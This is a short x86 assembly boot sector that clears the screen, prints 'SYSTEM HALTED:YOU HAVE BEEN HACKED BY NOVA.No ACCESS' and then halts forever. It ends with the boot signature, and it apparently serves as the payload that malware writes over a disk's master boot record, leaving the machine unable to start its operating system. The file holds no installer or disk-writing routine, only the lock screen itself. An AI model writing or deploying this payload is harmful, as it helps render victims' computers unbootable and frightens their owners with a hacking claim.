[BITS 16]
[ORG 0X7C00]

start:
	cli
	mov ax, 0x0003
	int 0x10

	mov ax, 0x0B00
	mov bh, 0x00
	mov bl, 0x01
	int 0x10

	mov bh, 0x00
	mov ah, 0x02
	mov dh, 12
	mov dl, 18
	int 0x10

	mov si, msg

print_loop:
	lodsb
	test al, al
	jz freeze

	mov ah, 0x09
	mov bh, 0x00
	mov bl, 0x8F
	mov bl, 0x0F
	mov cx, 1
	int 0x10
	
	inc dl
	mov ah, 0x02
	int 0x10

	jmp print_loop

freeze:
	hlt
	jmp freeze

msg db "SYSTEM HALTED:YOU HAVE BEEN HACKED BY NOVA.No ACCESS",0

times 510-($-$$) db 0
dw 0xAA55

